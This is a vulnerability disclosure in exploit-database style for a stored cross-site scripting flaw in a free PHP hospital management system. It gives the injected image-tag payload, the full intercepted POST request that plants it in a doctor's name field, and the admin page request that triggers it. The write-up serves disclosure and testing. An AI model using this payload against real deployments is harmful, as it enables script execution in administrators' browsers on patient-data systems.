Exploit Title: Hospital Management System - Stored XSS

Application: Hospital Management System

Date: 11.11.2024

Bugs: XSS

Exploit Author: Salah Tayeh

Vendor Homepage: https://www.sourcecodester.com/

Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html

Version: 1.0

# Description
Stored Cross Site Scripting (XSS) in the "Vaidya Mitra" healthcare application, specifically in the doctor's account settings functionality. The issue arises due to inadequate input validation in the doctor's name parameter, allowing an attacker to inject malicious scripts into the system, leading to a Cross-Site Scripting (XSS) vulnerability.

# Proof of Concept (PoC)


**1. Exploiting Doctor's Account Settings:**

The attacker, using the Burp Suite Proxy tool, intercepts and modifies a POST request sent by the doctor to update their account settings.
The payload <img/src/onerror=prompt(1)> is injected into the name parameter.
The manipulated request looks like the following:

POST /vm/doctor/edit-doc.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 203
...

id00=4&oldemail=salahtayeh13%40yahoo.com&email=salahtayeh13%40yahoo.com&name=Dr.+Salah+Tayeh+%3Cimg%2Fsrc%2Fonerror%3Dprompt%281%29%3E&nic=12345678&Tele=7070707070&spec=1&password=doctor&cpassword=doctor

Upon submission, the payload gets stored in the doctor's name field.

**2. Triggering XSS in Admin's View:**

An admin viewing doctors' information at http://localhost/vm/admin/doctors.php inadvertently triggers the XSS vulnerability.
The admin sends a GET request to view a doctor's details:

GET /vm/admin/doctors.php?action=view&id=4 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
...

The server returns the doctor's information, and the XSS payload in the name field is executed in the admin's browser, leading to the alert being triggered.

PoC - Video: https://drive.google.com/file/d/1Omjwoh6B2xh41c3Av0_VJsoR7tascb1_/view?usp=sharing
